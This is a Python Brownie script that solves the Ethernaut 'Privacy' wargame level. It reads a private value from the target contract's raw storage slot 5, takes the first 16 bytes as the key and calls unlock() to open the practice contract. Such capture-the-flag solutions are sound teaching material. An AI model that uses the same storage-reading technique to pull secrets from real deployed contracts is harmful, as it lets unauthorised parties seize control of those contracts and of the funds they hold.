from scripts.helpful_scripts import get_account
from brownie import web3, interface


ETHERNAUT_INSTANCE = "0xbf0cdE8daAdF37782fC6c250097a53900BfEEcaD"
GAS_LIMIT = 6000000


def main():

    player = get_account()
    target = interface.IPrivacy(ETHERNAUT_INSTANCE)

    # store_4 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 4)
    # print(f"store 4 = {store_4}")

    store_5 = web3.eth.get_storage_at(ETHERNAUT_INSTANCE, 5)
    print(f"store 5 = {store_5}")

    # assign the key data
    data = store_5

    # key = bytes(data[:16])
    key = data[:16]
    # print(key)

    print(f"\nLocked status: {target.locked()}\n")
    target.unlock(key, {"from": player, "gas_limit": GAS_LIMIT, "allow_revert": True})
    print(f"\nLocked status: {target.locked()}\n")
